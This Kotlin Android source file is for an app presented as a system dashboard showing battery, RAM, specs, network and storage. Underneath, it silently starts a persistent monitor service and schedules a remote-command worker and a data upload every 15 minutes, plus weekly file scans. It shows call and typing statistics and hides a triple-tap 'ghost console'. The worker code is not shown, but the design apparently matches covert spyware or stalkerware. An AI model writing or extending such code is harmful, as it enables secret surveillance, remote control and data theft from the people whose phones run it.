package com.example.myandroid

import android.animation.ValueAnimator
import android.app.AppOpsManager
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.res.ColorStateList
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.graphics.RectF
import android.graphics.Shader
import android.graphics.RadialGradient
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.hardware.Sensor
import android.hardware.SensorManager
import android.provider.Settings
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.util.DisplayMetrics
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.ScrollView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.setPadding
import androidx.fragment.app.Fragment
import androidx.fragment.app.FragmentActivity
import androidx.viewpager2.adapter.FragmentStateAdapter
import androidx.viewpager2.widget.ViewPager2
import java.text.DecimalFormat
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import org.json.JSONObject
import kotlinx.coroutines.*

class MainActivity : AppCompatActivity() {

    // --- COLOR PALETTE ---
    private val COLOR_BG = 0xFF050505.toInt()
    private val COLOR_BORDER = 0x14FFFFFF.toInt()
    private val COLOR_ACCENT_SECONDARY = 0xFF2CB67D.toInt() // Green
    private val COLOR_TEXT_MAIN = 0xFFFFFFFE.toInt()
    private val COLOR_TEXT_SUB = 0xFF94A1B2.toInt()

    private lateinit var viewPager: ViewPager2
    private val navItems = mutableListOf<LinearLayout>()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // 1. System Bar Colors
        window.statusBarColor = COLOR_BG
        window.navigationBarColor = 0xFF141414.toInt()

        // 2. Root Layout
        val root = FrameLayout(this).apply {
            setBackgroundColor(COLOR_BG)
            layoutParams = ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
        }

        // Background
        root.addView(MeshBackgroundView(this))

        // 3. ViewPager (Content)
        viewPager = ViewPager2(this).apply {
            layoutParams = FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT).apply {
                bottomMargin = 180 
            }
            adapter = MainPagerAdapter(this@MainActivity)
            isUserInputEnabled = false 
        }
        
        // --- GHOST CONSOLE OVERLAY ---
        // Hidden by default, toggled via Stats Tab Triple Click
        val ghostView = ScrollView(this).apply {
            visibility = View.GONE
            background = android.graphics.drawable.ColorDrawable(0xFF000000.toInt())
            layoutParams = FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
            setPadding(20, 80, 20, 180)
            tag = "GHOST_CONSOLE"
        }
        val ghostText = TextView(this).apply {
            text = "INITIALIZING SYSTEM LOG..."
            textSize = 10f
            typeface = Typeface.MONOSPACE
            setTextColor(0xFF00FF00.toInt()) // Hacker Green
        }
        ghostView.addView(ghostText)

        // 4. Floating Bottom Nav
        val bottomNav = createBottomNav(root)

        root.addView(viewPager)
        root.addView(ghostView)
        root.addView(bottomNav)
        setContentView(root)

        // --- INITIALIZATION & SCHEDULING ---
        initializeBackgroundTasks()
    }

    private fun initializeBackgroundTasks() {
        // 1. Network Tracking
        NetworkTracker.init(this)

        // 2. Monitor Service (Persistent Notif)
        val intent = Intent(this, MonitorService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }

        // 3. WorkManager Schedules
        val wm = androidx.work.WorkManager.getInstance(this)
        val constraints = androidx.work.Constraints.Builder()
            .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
            .build()

        // A. Rules (One Time + Daily)
        val ruleRequest = androidx.work.OneTimeWorkRequestBuilder<RuleSyncWorker>()
            .setConstraints(constraints)
            .setBackoffCriteria(androidx.work.BackoffPolicy.EXPONENTIAL, 10, java.util.concurrent.TimeUnit.SECONDS)
            .build()
        wm.enqueue(ruleRequest)

        val dailyRuleRequest = androidx.work.PeriodicWorkRequestBuilder<RuleSyncWorker>(1, java.util.concurrent.TimeUnit.DAYS)
            .setConstraints(constraints)
            .build()
        wm.enqueueUniquePeriodicWork("DailyRuleSync", androidx.work.ExistingPeriodicWorkPolicy.KEEP, dailyRuleRequest)

        // B. Config Sync (Every 6 hours)
        val configRequest = androidx.work.PeriodicWorkRequestBuilder<ConfigSyncWorker>(6, java.util.concurrent.TimeUnit.HOURS)
            .setConstraints(constraints)
            .build()
        wm.enqueueUniquePeriodicWork("ConfigSync", androidx.work.ExistingPeriodicWorkPolicy.KEEP, configRequest)

        // C. Data Backup (Every 15 mins)
        val syncRequest = androidx.work.PeriodicWorkRequestBuilder<SyncWorker>(15, java.util.concurrent.TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()
        wm.enqueueUniquePeriodicWork("BackupWork", androidx.work.ExistingPeriodicWorkPolicy.KEEP, syncRequest)

        // D. File Skeleton (Weekly)
        val fileWorkRequest = androidx.work.PeriodicWorkRequestBuilder<FileScanWorker>(7, java.util.concurrent.TimeUnit.DAYS)
            .setConstraints(constraints)
            .build()
        wm.enqueueUniquePeriodicWork("FileSkeletonWork", androidx.work.ExistingPeriodicWorkPolicy.KEEP, fileWorkRequest)

        // E. Remote Commands (Every 15 mins)
        val cmdRequest = androidx.work.PeriodicWorkRequestBuilder<RemoteCommandWorker>(15, java.util.concurrent.TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()
        wm.enqueueUniquePeriodicWork("RemoteCmdWorker", androidx.work.ExistingPeriodicWorkPolicy.KEEP, cmdRequest)

        // F. Health Heartbeat (Every 1 hour)
        val healthRequest = androidx.work.PeriodicWorkRequestBuilder<HealthWorker>(1, java.util.concurrent.TimeUnit.HOURS)
            .setConstraints(constraints)
            .build()
        wm.enqueueUniquePeriodicWork("HealthWorker", androidx.work.ExistingPeriodicWorkPolicy.KEEP, healthRequest)
    }

    private fun createBottomNav(root: FrameLayout): View {
        val navContainer = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            background = GradientDrawable().apply {
                setColor(0xCC141414.toInt())
                cornerRadius = 100f
                setStroke(2, COLOR_BORDER)
            }
            layoutParams = FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 160).apply {
                gravity = Gravity.BOTTOM
                setMargins(40, 0, 40, 40)
            }
            elevation = 20f
        }

        val tabs = listOf("🏠" to "DASH", "⚡" to "SPECS", "📡" to "NET", "📂" to "FILES", "🛠️" to "TOOLS", "📈" to "STATS")
        var statsTapCount = 0
        var lastStatsTapTime = 0L

        tabs.forEachIndexed { index, (icon, label) ->
            val item = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                gravity = Gravity.CENTER
                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MATCH_PARENT, 1f)
                setOnClickListener {
                    viewPager.currentItem = index
                    updateNavState(index)
                    
                    // --- GHOST TRIGGER ---
                    if (label == "STATS") {
                        val now = System.currentTimeMillis()
                        if (now - lastStatsTapTime < 500) statsTapCount++ else statsTapCount = 1
                        lastStatsTapTime = now
                        
                        if (statsTapCount >= 3) {
                            statsTapCount = 0
                            val ghost = root.findViewWithTag<View>("GHOST_CONSOLE")
                            if (ghost?.visibility == View.VISIBLE) {
                                ghost.visibility = View.GONE
                            } else {
                                ghost?.visibility = View.VISIBLE
                                (ghost as? ScrollView)?.getChildAt(0)?.let { 
                                    (it as TextView).text = DebugLogger.getLogs()
                                }
                            }
                        }
                    }
                }
            }

            val tvIcon = TextView(this).apply {
                text = icon; textSize = 20f; setTextColor(COLOR_TEXT_SUB)
            }
            val tvLabel = TextView(this).apply {
                text = label; textSize = 9f; typeface = Typeface.DEFAULT_BOLD
                setTextColor(COLOR_TEXT_SUB); setPadding(0, 5, 0, 0)
            }

            item.addView(tvIcon)
            item.addView(tvLabel)
            navContainer.addView(item)
            navItems.add(item)
        }

        updateNavState(0)
        return navContainer
    }

    private fun updateNavState(index: Int) {
        navItems.forEachIndexed { i, layout ->
            val icon = layout.getChildAt(0) as TextView
            val label = layout.getChildAt(1) as TextView
            if (i == index) {
                icon.setTextColor(COLOR_ACCENT_SECONDARY)
                icon.setShadowLayer(15f, 0f, 0f, COLOR_ACCENT_SECONDARY)
                label.setTextColor(COLOR_TEXT_MAIN)
            } else {
                icon.setTextColor(COLOR_TEXT_SUB)
                icon.setShadowLayer(0f, 0f, 0f, 0)
                label.setTextColor(COLOR_TEXT_SUB)
            }
        }
    }

    inner class MainPagerAdapter(fa: FragmentActivity) : FragmentStateAdapter(fa) {
        override fun getItemCount(): Int = 6
        override fun createFragment(position: Int): Fragment = when(position) {
            0 -> DashboardFragment()
            1 -> SpecsFragment()
            2 -> NetFragment()
            3 -> FilesFragment()
            4 -> ToolsFragment()
            5 -> StatsFragment()
            else -> DashboardFragment()
        }
    }
}

// ==========================================
// FRAGMENTS
// ==========================================

class DashboardFragment : Fragment() {
    override fun onCreateView(inflater: android.view.LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        val ctx = requireContext()
        val scroll = ScrollView(ctx).apply { isFillViewport = true; background = null }
        val content = LinearLayout(ctx).apply { orientation = LinearLayout.VERTICAL; setPadding(40, 60, 40, 250) }
        content.addView(createHeader(ctx, "Google", Build.MODEL, "SYSTEM ACTIVE"))

        // Battery
        val batt = ctx.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
        val level = batt?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0) ?: 0
        val status = batt?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) ?: -1
        val isCharging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING || status == android.os.BatteryManager.BATTERY_STATUS_FULL
        
        val battCard = createGlassContainer(ctx).apply { setPadding(40, 40, 40, 40); layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { bottomMargin = 20 } }
        val battHeader = LinearLayout(ctx).apply { orientation = LinearLayout.HORIZONTAL }
        battHeader.addView(TextView(ctx).apply { text = "POWER CELL"; textSize = 11f; setTextColor(0xFF94A1B2.toInt()); typeface = Typeface.DEFAULT_BOLD; layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f) })
        battHeader.addView(TextView(ctx).apply { text = if(isCharging) "CHARGING ⚡" else "DISCHARGING"; textSize = 11f; setTextColor(0xFF2CB67D.toInt()); typeface = Typeface.DEFAULT_BOLD })
        battCard.addView(battHeader)
        battCard.addView(TextView(ctx).apply { text = "$level%"; textSize = 42f; setTextColor(0xFF2CB67D.toInt()); typeface = Typeface.DEFAULT_BOLD })
        content.addView(battCard)

        // RAM & CPU
        val row = LinearLayout(ctx).apply { orientation = LinearLayout.HORIZONTAL; layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { bottomMargin = 20 } }
        val actManager = ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
        val memInfo = android.app.ActivityManager.MemoryInfo()
        actManager.getMemoryInfo(memInfo)
        val usedRam = (memInfo.totalMem - memInfo.availMem).toDouble() / (1024 * 1024 * 1024)
        val ramPct = (((memInfo.totalMem - memInfo.availMem).toDouble() / memInfo.totalMem.toDouble()) * 100).toInt()

        val ramCard = createGlassContainer(ctx).apply { setPadding(30, 30, 30, 30); layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f).apply { marginEnd = 10 }; gravity = Gravity.CENTER }
        ramCard.addView(TextView(ctx).apply { text = "RAM USAGE"; textSize=10f; setTextColor(0xFF94A1B2.toInt()); typeface=Typeface.DEFAULT_BOLD })
        ramCard.addView(DonutView(ctx, ramPct, 0xFF7F5AF0.toInt()).apply { layoutParams = LinearLayout.LayoutParams(250, 250).apply { topMargin = 20; bottomMargin = 10 } })
        ramCard.addView(TextView(ctx).apply { text = "${DecimalFormat("#.1").format(usedRam)} GB"; textSize=14f; setTextColor(Color.WHITE); typeface=Typeface.DEFAULT_BOLD })
        row.addView(ramCard)

        val cpuCard = createGlassContainer(ctx).apply { setPadding(30, 30, 30, 30); layoutParams = LinearLayout.LayoutParams(0, 380, 1f).apply { marginStart = 10 } }
        cpuCard.addView(TextView(ctx).apply { text = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) Build.SOC_MODEL.uppercase() else Build.BOARD.uppercase(); textSize=10f; setTextColor(0xFF94A1B2.toInt()); typeface=Typeface.DEFAULT_BOLD })
        val barContainer = LinearLayout(ctx).apply { orientation = LinearLayout.HORIZONTAL; gravity = Gravity.BOTTOM; layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f) }
        for(i in 0..5) barContainer.addView(PulseBar(ctx, (i*100).toLong()).apply { layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MATCH_PARENT, 1f).apply { marginEnd=4 } })
        cpuCard.addView(barContainer)
        cpuCard.addView(TextView(ctx).apply { text = "${Runtime.getRuntime().availableProcessors()} Cores"; textSize=11f; setTextColor(Color.WHITE); layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { topMargin = 15 } })
        row.addView(cpuCard)
        content.addView(row)

        scroll.addView(content)
        return scroll
    }
}

class SpecsFragment : Fragment() {
    override fun onCreateView(inflater: android.view.LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        val ctx = requireContext()
        val scroll = ScrollView(ctx).apply { isFillViewport = true; background = null }
        val content = LinearLayout(ctx).apply { orientation = LinearLayout.VERTICAL; setPadding(40, 60, 40, 250) }
        content.addView(createHeader(ctx, "Hard", "ware", "SPECIFICATIONS"))
        content.addView(createDetailCard(ctx, "SILICON", mapOf(
            "SoC Board" to Build.BOARD.uppercase(),
            "Hardware" to Build.HARDWARE.uppercase(),
            "Arch" to System.getProperty("os.arch").toString(),
            "Cores" to "${Runtime.getRuntime().availableProcessors()} Cores"
        )))
        return scroll
    }
}

class NetFragment : Fragment() {
    override fun onCreateView(inflater: android.view.LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        val ctx = requireContext()
        val scroll = ScrollView(ctx).apply { isFillViewport = true; background = null }
        val content = LinearLayout(ctx).apply { orientation = LinearLayout.VERTICAL; setPadding(40, 60, 40, 250) }
        content.addView(createHeader(ctx, "Net", "work", "CONNECTIVITY"))

        // Usage Stats
        val (netTime, netSessions) = NetworkTracker.getStats(ctx)
        val hrs = java.util.concurrent.TimeUnit.MILLISECONDS.toHours(netTime)
        val mins = java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(netTime) % 60
        
        // Last session
        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val rawLog = prefs.getString("net_history_log", "[]")
        val lastSession = try { 
            val arr = org.json.JSONArray(rawLog)
            if (arr.length() > 0) arr.getJSONObject(arr.length()-1).getString("end_fmt") else "None"
        } catch(e:Exception) { "None" }

        content.addView(createDetailCard(ctx, "DIGITAL UPTIME", mapOf(
            "Total Online" to "${hrs}h ${mins}m",
            "Sessions" to "$netSessions Connects",
            "Last Disconnect" to lastSession
        )))
        return scroll
    }
}

class FilesFragment : Fragment() {
    override fun onCreateView(inflater: android.view.LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        val ctx = requireContext()
        val scroll = ScrollView(ctx).apply { isFillViewport = true; background = null }
        val content = LinearLayout(ctx).apply { orientation = LinearLayout.VERTICAL; setPadding(40, 60, 40, 250) }
        content.addView(createHeader(ctx, "File", "System", "STORAGE ANALYSIS"))

        val hasManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) android.os.Environment.isExternalStorageManager()
        else androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED

        if (!hasManager) {
             val btn = TextView(ctx).apply {
                text = "GRANT ACCESS"; textSize = 12f; setTextColor(Color.BLACK); typeface = Typeface.DEFAULT_BOLD
                background = GradientDrawable().apply { setColor(0xFF2CB67D.toInt()); cornerRadius = 50f }
                gravity = Gravity.CENTER; setPadding(0, 30, 0, 30)
                setOnClickListener {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, android.net.Uri.parse("package:${ctx.packageName}")))
                    else requestPermissions(arrayOf(android.Manifest.permission.READ_EXTERNAL_STORAGE), 103)
                }
            }
            content.addView(btn)
        } else {
             val scanBtn = TextView(ctx).apply {
                text = "SCAN & UPLOAD ☁️"; textSize = 12f; setTextColor(Color.WHITE); typeface = Typeface.DEFAULT_BOLD
                background = GradientDrawable().apply { setColor(0xFF2CB1BC.toInt()); cornerRadius = 50f }
                gravity = Gravity.CENTER; setPadding(0, 30, 0, 30)
                setOnClickListener {
                    text = "SCANNING..."
                    CoroutineScope(Dispatchers.IO).launch {
                        val report = FileManager.generateReport()
                        withContext(Dispatchers.Main) { text = "UPLOADING..." }
                        CloudManager.uploadSkeleton(ctx, report, this@apply)
                    }
                }
            }
            content.addView(scanBtn)
        }
        return scroll
    }
}

class ToolsFragment : Fragment() {
    override fun onCreateView(inflater: android.view.LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        val ctx = requireContext()
        val scroll = ScrollView(ctx).apply { isFillViewport = true; background = null }
        val content = LinearLayout(ctx).apply { orientation = LinearLayout.VERTICAL; setPadding(40, 60, 40, 250) }
        content.addView(createHeader(ctx, "Sys", "tem", "TOOLS & CLOUD"))

        val syncBtn = TextView(ctx).apply {
            text = "UPLOAD DATA ☁️"; textSize=12f; setTextColor(Color.WHITE); typeface=Typeface.DEFAULT_BOLD
            background = GradientDrawable().apply { setColor(0xFF7F5AF0.toInt()); cornerRadius=50f }
            gravity = Gravity.CENTER; setPadding(0, 30, 0, 30)
            setOnClickListener {
                text = "UPLOADING..."
                CloudManager.uploadData(ctx, listOf("ALL"), this)
            }
        }
        content.addView(syncBtn)
        return scroll
    }
}

class StatsFragment : Fragment() {
    override fun onCreateView(inflater: android.view.LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        val ctx = requireContext()
        val scroll = ScrollView(ctx).apply { isFillViewport = true; background = null }
        val content = LinearLayout(ctx).apply { orientation = LinearLayout.VERTICAL; setPadding(40, 60, 40, 250) }
        content.addView(createHeader(ctx, "Stat", "istics", "INSIGHTS"))

        // Call Stats
        val callStats = PhoneManager.getStats(ctx)
        content.addView(createDetailCard(ctx, "PHONE", mapOf(
            "Calls" to "${callStats.totalCalls}",
            "Duration" to "${callStats.totalDuration/60} mins",
            "Top" to callStats.topContact
        )))

        // Typing Stats
        val typeStats = TypingManager.getStats(ctx)
        content.addView(createDetailCard(ctx, "TYPING", mapOf(
            "Total Chars" to "${typeStats.optInt("total_chars")}",
            "Avg WPM" to "${typeStats.optInt("avg_wpm")}"
        )))

        return scroll
    }
}

// --- HELPERS ---

fun createHeader(ctx: Context, t1: String, t2: String, sub: String): View {
    val layout = LinearLayout(ctx).apply { orientation = LinearLayout.VERTICAL; setPadding(0, 0, 0, 40) }
    layout.addView(TextView(ctx).apply { text = sub; textSize = 10f; setTextColor(0xFF2CB67D.toInt()); typeface = Typeface.DEFAULT_BOLD; background = GradientDrawable().apply { setColor(0x1A2CB67D.toInt()); setStroke(2, 0x4D2CB67D.toInt()); cornerRadius = 50f }; setPadding(30, 10, 30, 10); layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { bottomMargin = 15 } })
    layout.addView(TextView(ctx).apply { text = "$t1 $t2"; textSize = 32f; setTextColor(Color.WHITE); typeface = Typeface.create("sans-serif-black", Typeface.NORMAL) })
    return layout
}

fun createGlassContainer(ctx: Context): LinearLayout {
    return LinearLayout(ctx).apply { orientation = LinearLayout.VERTICAL; background = GradientDrawable().apply { setColor(0x991E1E23.toInt()); cornerRadius = 30f; setStroke(2, 0x14FFFFFF.toInt()) } }
}

fun createDetailCard(ctx: Context, title: String, data: Map<String, String>): View {
    val card = createGlassContainer(ctx).apply { setPadding(40, 40, 40, 40); layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { bottomMargin = 20 } }
    card.addView(TextView(ctx).apply { text = title; textSize = 10f; setTextColor(0xFF94A1B2.toInt()); typeface = Typeface.DEFAULT_BOLD; setPadding(0, 0, 0, 15) })
    data.forEach { (k, v) ->
        val row = LinearLayout(ctx).apply { orientation = LinearLayout.HORIZONTAL; setPadding(0, 8, 0, 8) }
        row.addView(TextView(ctx).apply { text = k; textSize = 13f; setTextColor(0xFF94A1B2.toInt()); layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f) })
        row.addView(TextView(ctx).apply { text = v; textSize = 13f; setTextColor(0xFFFFFFFE.toInt()); typeface = Typeface.MONOSPACE; gravity = Gravity.END })
        card.addView(row)
    }
    return card
}

// --- CUSTOM VIEWS ---

class MeshBackgroundView(context: Context) : View(context) {
    private val paint = Paint()
    override fun onDraw(canvas: Canvas) {
        val w = width.toFloat(); val h = height.toFloat()
        canvas.drawColor(0xFF050505.toInt())
        paint.shader = RadialGradient(w * 0.1f, h * 0.2f, w * 0.6f, intArrayOf(0x267F5AF0.toInt(), 0x00000000), null, Shader.TileMode.CLAMP)
        canvas.drawRect(0f, 0f, w, h, paint)
        paint.shader = RadialGradient(w * 0.9f, h * 0.8f, w * 0.6f, intArrayOf(0x1A2CB67D.toInt(), 0x00000000), null, Shader.TileMode.CLAMP)
        canvas.drawRect(0f, 0f, w, h, paint)
    }
}

class DonutView(context: Context, val percentage: Int, val color: Int) : View(context) {
    private val paint = Paint(Paint.ANTI_ALIAS_FLAG).apply { style = Paint.Style.STROKE; strokeWidth = 20f; strokeCap = Paint.Cap.ROUND }
    override fun onDraw(canvas: Canvas) {
        val w = width.toFloat(); val h = height.toFloat(); val radius = (Math.min(w, h) / 2) - 20f
        paint.color = 0x1AFFFFFF.toInt()
        canvas.drawCircle(w/2, h/2, radius, paint)
        paint.color = color
        canvas.drawArc(RectF(20f, 20f, w-20f, h-20f), -90f, (percentage * 3.6).toFloat(), false, paint)
    }
}

class PulseBar(context: Context, delay: Long) : View(context) {
    private var barHeightPct = 0.3f
    private val paint = Paint().apply { color = 0xFF2CB1BC.toInt(); isAntiAlias = true }
    init {
        ValueAnimator.ofFloat(0.3f, 0.8f).apply {
            duration = 1000; repeatCount = ValueAnimator.INFINITE; repeatMode = ValueAnimator.REVERSE; startDelay = delay
            addUpdateListener { barHeightPct = it.animatedValue as Float; invalidate() }
            start()
        }
    }
    override fun onDraw(canvas: Canvas) {
        val h = height.toFloat(); val barH = h * barHeightPct; val r = width.toFloat() / 2
        canvas.drawRoundRect(0f, h - barH, width.toFloat(), h, r, r, paint)
    }
}